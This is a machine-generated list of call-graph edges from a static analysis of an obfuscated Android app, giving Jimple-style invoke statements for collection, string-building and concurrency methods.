STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean equals(int[],int[])>($r8, $r9) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean equals(int[],int[])>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lql: int size()>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Iterator: java.lang.Object next()>() in <lri: int b(java.util.Set)> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: $r6 = virtualinvoke r0.<lqs: lsa l()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lqs: lsa l()>
INTERFACE edge: $r3 = interfaceinvoke $r2.<java.util.Map$Entry: java.lang.Object getValue()>() in <lid: boolean equals(java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getValue()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lta: boolean equals(java.lang.Object)> ==> <lsp: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lma: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <lrg: int hashCode()>
SPECIAL edge: specialinvoke $r0.<java.lang.IndexOutOfBoundsException: void <init>(java.lang.String)>($r3) in <iye: void O(int,int)> ==> <java.lang.IndexOutOfBoundsException: void <init>(java.lang.String)>
STATIC edge: $i0 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: int k(int)>($i0) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: int k(int)>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean e()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean e()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.Enum: int hashCode()>
INTERFACE edge: $i0 = interfaceinvoke $r1.<java.util.Map: int size()>() in <ljd: int size()> ==> <java.util.HashMap: int size()>
STATIC edge: $i6 = staticinvoke <java.lang.Math: int min(int,int)>(1073741823, $i6) in <ljf: boolean add(java.lang.Object)> ==> <java.lang.Math: int min(int,int)>
STATIC edge: $z0 = staticinvoke <kzs: boolean d(java.lang.Object,java.lang.Object)>($r1, $r3) in <lid: boolean equals(java.lang.Object)> ==> <kzs: boolean d(java.lang.Object,java.lang.Object)>
STATIC edge: $r1 = staticinvoke <iye: java.lang.String X(int,int,java.lang.String)>($i1, $i0, "index") in <iye: void Q(int,int)> ==> <iye: java.lang.String X(int,int,java.lang.String)>
STATIC edge: $i8 = staticinvoke <izw: int aj(java.lang.Object,int)>($r1, $i3) in <ljd: int z(int,int,int,int)> ==> <izw: int aj(java.lang.Object,int)>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljd: java.util.Map o()>() in <ljd: java.lang.Object get(java.lang.Object)> ==> <ljd: java.util.Map o()>
SPECIAL edge: specialinvoke $r1.<java.lang.IndexOutOfBoundsException: void <init>(java.lang.String)>("cannot read from empty metadata") in <ltr: lsz c(int)> ==> <java.lang.IndexOutOfBoundsException: void <init>(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.StringBuilder: java.lang.String toString()>() in <izw: void as(int,java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lkq: int hashCode()>
VIRTUAL edge: $r3 = virtualinvoke $r2.<mly: java.lang.IllegalArgumentException f()>() in <lkt: lkx b(boolean)> ==> <mly: java.lang.IllegalArgumentException f()>
VIRTUAL edge: $c1 = virtualinvoke $r0.<java.lang.String: char charAt(int)>(2) in <ivw: boolean F(java.lang.String)> ==> <java.lang.String: char charAt(int)>
STATIC edge: $r0 = staticinvoke <j$.util.concurrent.r: j$.util.concurrent.s g(j$.util.concurrent.s,j$.util.concurrent.s)>($r0, $r2) in <j$.util.concurrent.r: j$.util.concurrent.s c(j$.util.concurrent.s,j$.util.concurrent.s)> ==> <j$.util.concurrent.r: j$.util.concurrent.s g(j$.util.concurrent.s,j$.util.concurrent.s)>
INTERFACE edge: $r2 = interfaceinvoke $r3.<java.util.Map: java.lang.Object put(java.lang.Object,java.lang.Object)>($r2, $r1) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.util.HashMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalStateException: void <init>(java.lang.String)>($r4) in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.IllegalStateException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r4.<nzh: void d()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: void d()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <lid: int hashCode()>
VIRTUAL edge: $r14 = virtualinvoke $r7.<lts: lsz c(int)>($i1) in <lsd: boolean b(lsr)> ==> <lsm: lsz c(int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <j$.util.concurrent.k: boolean equals(java.lang.Object)> ==> <lta: boolean equals(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <lrg: int hashCode()>
STATIC edge: $z0 = staticinvoke <ivw: boolean O(char)>($c2) in <ivw: boolean s(java.lang.String)> ==> <ivw: boolean O(char)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r4) in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
SPECIAL edge: specialinvoke $r6.<j$.util.concurrent.w: void <init>()>() in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <j$.util.concurrent.w: void <init>()>
VIRTUAL edge: $i6 = virtualinvoke $r3.<java.lang.Object: int hashCode()>() in <lma: lma i(int,java.lang.Object[])> ==> <lqr: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lma: boolean equals(java.lang.Object)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorAutocompleteMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(45) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lrg: int hashCode()> ==> <lrg: int hashCode()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lqs: lsa l()>() in <lqs: java.util.Iterator iterator()> ==> <lqs: lsa l()>
VIRTUAL edge: $i0 = virtualinvoke r0.<ljd: int e()>() in <ljd: java.util.Map m()> ==> <ljd: int e()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lkq: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lkq: boolean equals(java.lang.Object)>
INTERFACE edge: $r3 = interfaceinvoke $r8.<java.util.Map$Entry: java.lang.Object getKey()>() in <lmb: lme f()> ==> <ljb: java.lang.Object getKey()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <nzh: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljf: java.util.Set g()>() in <ljf: java.util.Iterator iterator()> ==> <ljf: java.util.Set g()>
SPECIAL edge: specialinvoke $r2.<nzh: void <init>()>() in <ivv: void <init>(byte[])> ==> <nzh: void <init>()>
STATIC edge: staticinvoke <ojg: void d(java.lang.Object,java.lang.String)>($r1, "destination") in <nvw: void j(int[],int[],int,int,int)> ==> <ojg: void d(java.lang.Object,java.lang.String)>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lrg: int size()>
INTERFACE edge: $r4 = interfaceinvoke $r3.<java.util.Map: java.lang.Object get(java.lang.Object)>($r1) in <lli: void e(java.lang.Object,java.lang.Object)> ==> <ljd: java.lang.Object get(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.String: int length()>() in <ivv: void g(java.lang.String)> ==> <java.lang.String: int length()>
VIRTUAL edge: $r7 = virtualinvoke $r4.<nzh: java.lang.String c()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: java.lang.String c()>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lmb: lme f()> ==> <lnc: boolean hasNext()>
STATIC edge: $r5 = staticinvoke <lqd: lqd b(java.util.Comparator)>($r4) in <lmb: lme f()> ==> <lqd: lqd b(java.util.Comparator)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lkq: int size()>() in <lkq: int hashCode()> ==> <lql: int size()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lkq: int hashCode()>
SPECIAL edge: specialinvoke $r25.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.l)>($i5, $r15, $r16, $r10) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.l)>
INTERFACE edge: $z0 = interfaceinvoke $r10.<java.util.Iterator: boolean hasNext()>() in <hbv: void j()> ==> <lnc: boolean hasNext()>
SPECIAL edge: $r3 = specialinvoke r0.<ljf: java.lang.Object[] s()>() in <ljf: void j(int,java.lang.Object,int,int)> ==> <ljf: java.lang.Object[] s()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <lqr: int hashCode()>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lta: boolean equals(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lma: boolean equals(java.lang.Object)>
STATIC edge: $r6 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i4) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
STATIC edge: $i0 = staticinvoke <izw: int ag(int,int,int)>($i0, $i1, 31) in <ljf: void q(int)> ==> <izw: int ag(int,int,int)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.LinkageError: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke r0.<lsn: void q(lsz,java.lang.Object)>($r3, $r24) in <lsd: boolean b(lsr)> ==> <lsn: void q(lsz,java.lang.Object)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" threw ") in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r7 = virtualinvoke $r4.<nzh: java.lang.String c()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: java.lang.String c()>
INTERFACE edge: $r2 = interfaceinvoke $r9.<java.util.Map$Entry: java.lang.Object getValue()>() in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.k: java.lang.Object getValue()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <j$.sun.misc.b: void <init>(sun.misc.Unsafe)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lta: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <lvm: void h(boolean,java.lang.String)>($z0, "maxDepth must be > 0 or -1") in <lwk: java.lang.StackTraceElement[] b(java.lang.Class,int)> ==> <lvm: void h(boolean,java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke r0.<lma: boolean d()>() in <lma: boolean equals(java.lang.Object)> ==> <lma: boolean d()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkq: lsb B()>() in <lkq: java.util.Iterator iterator()> ==> <lkq: lsb B()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r9 = virtualinvoke $r8.<lme: lma d(java.lang.Object)>($r13) in <hbv: void j()> ==> <lme: lma d(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<lql: void <init>(java.lang.Object[],int)>($r1, $i0) in <lkq: lkq h(java.lang.Object[],int)> ==> <lql: void <init>(java.lang.Object[],int)>
INTERFACE edge: $r4 = interfaceinvoke $r3.<java.util.Map$Entry: java.lang.Object getValue()>() in <lvr: int a(java.util.Map$Entry,int,int,java.lang.Object[],int[])> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getValue()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <hfd: void <init>(hff,java.lang.Class,ldp)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: virtualinvoke r0.<lkh: int b(java.lang.Object[],int)>($r1, 0) in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lrg: int b(java.lang.Object[],int)>
SPECIAL edge: specialinvoke r0.<lma: void <init>()>() in <lrg: void <init>(java.lang.Object)> ==> <lma: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
STATIC edge: $r2 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
INTERFACE edge: $r5 = interfaceinvoke $r2.<java.util.List: java.util.Iterator iterator()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lkq: java.util.Iterator iterator()>
VIRTUAL edge: virtualinvoke r0.<nzh: void d()>() in <nzh: boolean f(ivv)> ==> <nzh: void d()>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Enum: void <init>(java.lang.String,int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $i1 = staticinvoke <izw: int ak(int)>($i0) in <ljd: int b()> ==> <izw: int ak(int)>
SPECIAL edge: $z1 = specialinvoke $r2.<ivw: boolean P()>() in <ivw: boolean equals(java.lang.Object)> ==> <ivw: boolean P()>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Map: java.util.Set entrySet()>() in <lmb: lme f()> ==> <ljd: java.util.Set entrySet()>
STATIC edge: $z0 = staticinvoke <ivw: boolean t(char[],int,int)>($r3, $i0, $i1) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean t(char[],int,int)>
STATIC edge: $i6 = staticinvoke <izw: int ag(int,int,int)>($i7, $i8, $i4) in <ljf: int o(int,int,int,int)> ==> <izw: int ag(int,int,int)>
STATIC edge: $i2 = staticinvoke <j$.util.concurrent.ThreadLocalRandom: int b()>() in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ThreadLocalRandom: int b()>
STATIC edge: $i1 = staticinvoke <izw: int ak(int)>($i0) in <ljf: int b()> ==> <izw: int ak(int)>
INTERFACE edge: $z0 = interfaceinvoke $r6.<java.util.Iterator: boolean hasNext()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lsb: boolean hasNext()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <java.lang.Enum: void <init>(java.lang.String,int)> ==> <java.lang.Object: void <init>()>
INTERFACE edge: $r3 = interfaceinvoke $r2.<java.util.Map$Entry: java.lang.Object getKey()>() in <lid: boolean equals(java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
SPECIAL edge: $i4 = specialinvoke r0.<ljd: int z(int,int,int,int)>($i4, $i5, $i3, $i0) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: int z(int,int,int,int)>
STATIC edge: staticinvoke <java.lang.Double: boolean isNaN(double)>($d0) in <lma: int e(int)> ==> <java.lang.Double: boolean isNaN(double)>
STATIC edge: staticinvoke <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)>
VIRTUAL edge: $r9 = virtualinvoke $r7.<lme: lma c()>() in <hbv: void j()> ==> <lme: lma c()>
STATIC edge: $i0 = staticinvoke <izw: int ag(int,int,int)>($i0, $i1, 31) in <ljd: void A(int)> ==> <izw: int ag(int,int,int)>
SPECIAL edge: specialinvoke r0.<lli: void <init>()>() in <lmb: void <init>()> ==> <lli: void <init>()>
INTERFACE edge: $z0 = interfaceinvoke $r6.<java.util.Iterator: boolean hasNext()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lsb: boolean hasNext()>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <lrg: int hashCode()>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lsb: java.lang.Object next()>
SPECIAL edge: specialinvoke $r5.<java.util.ConcurrentModificationException: void <init>()>() in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.util.ConcurrentModificationException: void <init>()>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lqs: boolean equals(java.lang.Object)> ==> <ljf: int size()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r1, $r2) in <lkt: void a(java.lang.Object,java.lang.Object)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
VIRTUAL edge: virtualinvoke $r6.<gwk: void a(gwm)>(r0) in <hcb: void <init>()> ==> <gwk: void a(gwm)>
STATIC edge: staticinvoke <iye: void y(boolean,java.lang.Object)>(1, "Expected size must be >= 0") in <ljf: void i(int)> ==> <iye: void y(boolean,java.lang.Object)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lkq: int hashCode()>
CLINIT edge: staticinvoke <lqk: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lqk: void <clinit>()>
SPECIAL edge: specialinvoke $r0.<miv: void <init>(java.lang.Object)>($r1) in <kwe: miy x(java.lang.Object)> ==> <miv: void <init>(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <java.util.AbstractSet: int hashCode()>
STATIC edge: $r4 = staticinvoke <lma: lma w(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object[])>("ar-XT", "bgp-XC", "bgp-XT", "bgq-PK", "bgq-XU", "bm-XF", $r0) in <ivw: void <clinit>()> ==> <lma: lma w(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object[])>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljd: java.lang.Object[] y()>() in <ljd: void u(int,java.lang.Object)> ==> <ljd: java.lang.Object[] y()>
VIRTUAL edge: virtualinvoke r0.<ljf: void i(int)>(3) in <ljf: void <init>()> ==> <ljf: void i(int)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<lkq: java.lang.Object get(int)>($i0) in <lkm: java.lang.Object a(int)> ==> <lql: java.lang.Object get(int)>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r7, $i3, $r1, $i1, $i2) in <lvr: int a(java.util.Map$Entry,int,int,java.lang.Object[],int[])> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lqo: lsa l()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Integer: java.lang.Integer valueOf(int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lrg: int hashCode()> ==> <lid: int hashCode()>
SPECIAL edge: specialinvoke r0.<lma: void <init>()>() in <lqr: void <init>(java.lang.Object[],int,java.lang.Object[],int,int)> ==> <lma: void <init>()>
SPECIAL edge: specialinvoke $r3.<ivw: void <init>(ivv,java.lang.String)>(r0, $r2) in <ivv: ivw i(java.lang.String)> ==> <ivw: void <init>(ivv,java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lma: int hashCode()>
VIRTUAL edge: $z2 = virtualinvoke $r9.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l6, $i7, $i5) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
SPECIAL edge: specialinvoke $r0.<java.lang.String: void <init>()>() in <lsn: void <clinit>()> ==> <java.lang.String: void <init>()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Parameter specified as non-null is null: method ") in <ojg: void v(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r3) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
SPECIAL edge: specialinvoke $r2.<java.lang.ThreadLocal: void <init>()>() in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.lang.ThreadLocal: void <init>()>
STATIC edge: staticinvoke <iye: void Q(int,int)>($i1, $i0) in <lsb: void <init>(int,int)> ==> <iye: void Q(int,int)>
SPECIAL edge: specialinvoke $r3.<lqq: void <init>(java.lang.Object,java.lang.Object[],int)>(null, $r0, 1) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <lqq: void <init>(java.lang.Object,java.lang.Object[],int)>
STATIC edge: $i1 = staticinvoke <j$.util.concurrent.ThreadLocalRandom: int a(int)>($i1) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ThreadLocalRandom: int a(int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<lma: boolean m()>() in <lma: lma p(java.util.Collection)> ==> <lqr: boolean m()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lid: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke r0.<ljf: void j(int,java.lang.Object,int,int)>($i0, $r1, $i3, $i5) in <ljf: boolean add(java.lang.Object)> ==> <ljf: void j(int,java.lang.Object,int,int)>
CLINIT edge: staticinvoke <jpq: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <jpq: void <clinit>()>
STATIC edge: staticinvoke <iye: void y(boolean,java.lang.Object)>(1, "the total number of elements must fit in an int") in <lma: lma w(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object[])> ==> <iye: void y(boolean,java.lang.Object)>
STATIC edge: $r6 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i4) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
INTERFACE edge: $r6 = interfaceinvoke $r4.<java.util.Set: java.util.Iterator iterator()>() in <lqs: boolean equals(java.lang.Object)> ==> <lqr: java.util.Iterator iterator()>
STATIC edge: $r3 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r3) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lmb: lme f()> ==> <lqr: int size()>
STATIC edge: $r4 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>($r3, $i2) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r4) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
CLINIT edge: staticinvoke <hbu: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <hbu: void <clinit>()>
SPECIAL edge: specialinvoke $r4.<java.lang.Throwable: void <init>()>() in <lwk: java.lang.StackTraceElement[] b(java.lang.Class,int)> ==> <java.lang.Throwable: void <init>()>
VIRTUAL edge: $r1 = virtualinvoke $r0.<java.lang.StringBuilder: java.lang.String toString()>() in <lri: void t(java.lang.Object,int)> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $r4 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r4) in <lqm: java.lang.Object get(int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lkq: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <lmo: lqs G(java.util.Comparator)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke r0.<lkh: int c()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lql: int c()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <izw: void as(int,java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lta: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.Object: int hashCode()>() in <izw: int ad(java.lang.Object)> ==> <lrg: int hashCode()>
VIRTUAL edge: $c2 = virtualinvoke $r0.<java.lang.String: char charAt(int)>($i0) in <ivw: boolean v(java.lang.String)> ==> <java.lang.String: char charAt(int)>
VIRTUAL edge: $z0 = virtualinvoke $r6.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <lsp: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(4) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: specialinvoke r0.<lsn: void <init>(java.util.logging.Level)>($r1) in <lsd: void <init>(java.util.logging.Level)> ==> <lsn: void <init>(java.util.logging.Level)>
